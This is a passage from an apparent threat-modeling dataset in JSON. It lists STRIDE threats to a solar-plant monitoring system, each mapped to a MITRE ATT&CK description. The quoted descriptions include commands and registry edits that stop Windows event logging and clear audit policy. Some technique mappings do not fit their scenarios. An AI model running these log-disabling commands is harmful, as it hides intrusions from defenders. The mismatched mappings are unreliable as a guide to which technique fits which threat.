                    "Condition": "Valid if root access is not monitored."
                }
            ],
            "Potential Impact": "Full control over the Data Logger, risking data manipulation and system control.",
            "MITRE ATT&CK Keywords": [
                "firmware exploitation",
                "root access",
                "unauthorized privileges",
                "system integrity risk"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "18",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate data logger to send falsified data to the receiver.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access to the communication channel between the data logger and receiver.",
                    "Role": "Attacker",
                    "Condition": "Network access achieved."
                },
                {
                    "Assumption": "The attacker has knowledge of the communication protocols used.",
                    "Role": "Attacker",
                    "Condition": "Protocol details obtained from prior reconnaissance."
                },
                {
                    "Assumption": "There is insufficient mutual authentication between data loggers and the receiver.",
                    "Role": "System Architect",
                    "Condition": "Lack of robust authentication mechanisms."
                }
            ],
            "Potential Impact": "Data integrity and accuracy of predictions compromised.",
            "MITRE ATT&CK Keywords": [
                "Impersonation",
                "Network",
                "Data Logger",
                "Spoofing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a legitimate employee to access the dashboard.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained the legitimate employee\u2019s credentials.",
                    "Role": "Attacker",
                    "Condition": "Credentials stolen through phishing or other means."
                },
                {
                    "Assumption": "Insufficient security measures on the login interface.",
                    "Role": "System Architect",
                    "Condition": "Weak authentication or lack of multi-factor authentication."
                },
                {
                    "Assumption": "The attacker knows the URL of the dashboard.",
                    "Role": "Attacker",
                    "Condition": "Information obtained through scanning or social engineering."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and system controls.",
            "MITRE ATT&CK Keywords": [
                "Phishing",
                "Credentials",
                "Dashboard",
                "Spoofing"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates the Anonymity Agent to inject malicious pre-processed data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and modify data in transit.",
                    "Role": "Attacker",
                    "Condition": "Man-in-the-middle attack executed."
                },
                {
                    "Assumption": "There are vulnerabilities in the communication encryption.",
                    "Role": "System Architect",
                    "Condition": "Use of outdated or weak encryption algorithms."
                },
                {
                    "Assumption": "The system lacks robust validation checks for the anonymized data.",
                    "Role": "System Architect",
                    "Condition": "Insufficient data integrity validation mechanisms."
                }
            ],
            "Potential Impact": "Corrupted training data impacting AI/ML model accuracy.",
            "MITRE ATT&CK Keywords": [
                "Man-in-the-middle",
                "Encryption",
                "Anonymity Agent",
                "Spoofing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the data collected by the sensors before it reaches the data logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker accesses the physical site of the sensors.",
                    "Role": "Attacker",
                    "Condition": "Physical security compromised."
                },
                {
                    "Assumption": "The attacker has the necessary tools to interface with the sensors.",
                    "Role": "Attacker",
                    "Condition": "Tools obtained through prior preparation or theft."
                },
                {
                    "Assumption": "Sensor data is not adequately encrypted in transit.",
                    "Role": "System Architect",
                    "Condition": "Lack of end-to-end encryption."
                }
            ],
            "Potential Impact": "Inaccurate predictions and maintenance schedules.",
            "MITRE ATT&CK Keywords": [
                "Physical Access",
                "Sensors",
                "Data Tampering",
                "Tampering"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker corrupts the AI/ML model by modifying the parameters during the training process.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the TOREADOR platform.",
                    "Role": "Attacker",
                    "Condition": "Access achieved through compromised credentials or exploitation."
                },
                {
                    "Assumption": "Insufficient access control mechanisms on the TOREADOR platform.",
                    "Role": "System Architect",
                    "Condition": "Weak or missing authorization checks."
                },
                {
                    "Assumption": "The system lacks monitoring for unauthorized changes in model parameters.",
                    "Role": "System Architect",
                    "Condition": "Lack of rigorous monitoring and logs."
                }
            ],
            "Potential Impact": "AI/ML model reliability is diminished, potentially resulting in hardware failures or suboptimal power flow.",
            "MITRE ATT&CK Keywords": [
                "Model Corruption",
                "AI/ML",
                "TOREADOR",
                "Tampering"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates the dashboard scripts to execute malicious actions when accessed by an employee.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the server hosting the dashboard scripts.",
                    "Role": "Attacker",
                    "Condition": "Server access through exploitation or insider threat."
                },
                {
                    "Assumption": "The dashboard scripts are not adequately protected against injection attacks.",
                    "Role": "System Architect",
                    "Condition": "Insufficient code and configuration auditing."
                },
                {
                    "Assumption": "There is a lack of integrity verification for script files.",
                    "Role": "System Architect",
                    "Condition": "No end-to-end integrity checks in place."
                }
            ],
            "Potential Impact": "Execution of unauthorized actions, exfiltration of sensitive data, or disruption of the dashboard service.",
            "MITRE ATT&CK Keywords": [
                "Script Injection",
                "Dashboard",
                "Malicious Actions",
                "Tampering"
            ],
            "mitre_technique": {
                "name": "Cloud Service Dashboard",
                "description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",
                "id": "attack-pattern--e49920b0-6c54-40c1-9571-73723653205f",
                "technique_id": "T1538"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider employee denies having accessed sensitive data or made specific changes to the AI/ML models.",
            "Assumptions": [
                {
                    "Assumption": "Lack of comprehensive logging and monitoring systems.",
                    "Role": "System Architect",
                    "Condition": "Logs are either incomplete or non-existent."
                },
                {
                    "Assumption": "Inadequate access control measures on sensitive operations.",
                    "Role": "System Architect",
                    "Condition": "Weak or missing authorization mechanisms."
                },
                {
                    "Assumption": "No digital signatures or verifiable storing methods for important actions.",
                    "Role": "System Architect",
                    "Condition": "Actions are not digitally signed."
                }
            ],
            "Potential Impact": "Inability to hold users accountable, potential manipulation of model parameters without traceability.",
            "MITRE ATT&CK Keywords": [
                "Non-repudiation",
                "Logging",
                "Access Control",
                "Repudiation"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker modifies logs to cover their tracks after unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The attacker gains administrative access to log files.",
                    "Role": "Attacker",
                    "Condition": "Gained administrative privileges."
                },
                {
                    "Assumption": "Log files are stored in a location accessible by the attacker.",
                    "Role": "System Architect",
                    "Condition": "Log files insufficiently protected."
                },
                {
                    "Assumption": "No integrity checks for log files are in place.",
                    "Role": "System Architect",
                    "Condition": "Logs are not protected by hashing or integrity checks."
                }
            ],
            "Potential Impact": "Inability to detect and respond to unauthorized actions, loss of audit trail fidelity.",
            "MITRE ATT&CK Keywords": [
                "Log Manipulation",
                "Administrative Access",
                "Track Covering",
                "Repudiation"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having conducted critical operations on the TOREADOR platform due to lack of proper audit trails.",
            "Assumptions": [
                {
                    "Assumption": "No detailed logging of critical operations.",
                    "Role": "System Architect",
                    "Condition": "Logging insufficient or improperly configured."
                },
                {
                    "Assumption": "Inadequate system of user roles and permissions.",
                    "Role": "System Architect",
                    "Condition": "Weak or poorly defined roles."
                },
                {
                    "Assumption": "The system does not use tamper-evident logging mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Logs are mutable by trusted roles."
                }
            ],
            "Potential Impact": "Loss of traceability and accountability for actions taken, potentially leading to misuse of the platform.",
            "MITRE ATT&CK Keywords": [
                "Audit Trail",
                "Logging",
                "Operations Denial",
                "Repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data transmitted from sensors to the data logger.",
            "Assumptions": [
                {
                    "Assumption": "Data sent from sensors is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption mechanisms in place."
                },
                {
                    "Assumption": "The attacker has access to the communication channel between sensors and data logger.",
                    "Role": "Attacker",
                    "Condition": "Network access achieved."
                },
                {
                    "Assumption": "No secure communication protocols are used.",
                    "Role": "System Architect",
                    "Condition": "Use of outdated or insecure protocols."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "Intercept",
                "Unencrypted Data",
                "Sensors",
                "Information Disclosure"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive metadata about the solar power plants is leaked from the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the metadata storage area on the TOREADOR platform.",
                    "Role": "Attacker",
                    "Condition": "Platform access achieved through credential theft or exploitation."
                },
                {
                    "Assumption": "Metadata is not adequately protected with encryption.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption for metadata."
                },
                {
                    "Assumption": "There are inadequate access control mechanisms for metadata retrieval.",
                    "Role": "System Architect",
                    "Condition": "Weak or non-existent authorization checks."
                }
            ],
            "Potential Impact": "Exposure of critical metadata, resulting in potential security and operational risks.",
            "MITRE ATT&CK Keywords": [
                "Metadata Exposure",
                "TOREADOR",
                "Sensitive Information",
                "Information Disclosure"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the dashboard to extract sensitive predictions and operational data.",
            "Assumptions": [
                {
                    "Assumption": "The dashboard contains a vulnerability that can be exploited remotely.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability discovered during reconnaissance."
                },
                {
                    "Assumption": "The attacker has network access to the dashboard.",
                    "Role": "Attacker",
                    "Condition": "Network access achieved."
                },
                {
                    "Assumption": "Sensitive data displayed on the dashboard is not adequately protected.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption or access control measures."
                }
            ],
            "Potential Impact": "Unauthorized access to predictions and historical data, leading to potential misuse.",
            "MITRE ATT&CK Keywords": [
                "Dashboard Vulnerability",
                "Data Extraction",
                "Sensitive Data",
                "Information Disclosure"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain 